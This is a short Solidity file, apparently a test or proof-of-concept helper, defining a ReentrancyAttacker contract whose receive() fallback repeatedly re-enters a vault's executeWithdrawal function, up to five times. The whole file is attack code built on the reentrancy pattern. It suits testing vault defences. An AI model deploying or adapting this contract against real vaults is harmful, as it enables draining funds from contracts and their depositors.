// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit(address token, uint256 amount) external;
    function executeWithdrawal(bytes32 id) external;
}

contract ReentrancyAttacker {
    IVault public vault;
    address public token;
    uint256 public attackCount;

    constructor(address _vault, address _token) {
        vault = IVault(_vault);
        token = _token;
    }

    function attack() external {
        vault.deposit(token, 1e18);
    }

    receive() external payable {
        if (attackCount < 5) {
            attackCount++;
            try vault.executeWithdrawal(bytes32(0)) {} catch {}
        }
    }
}
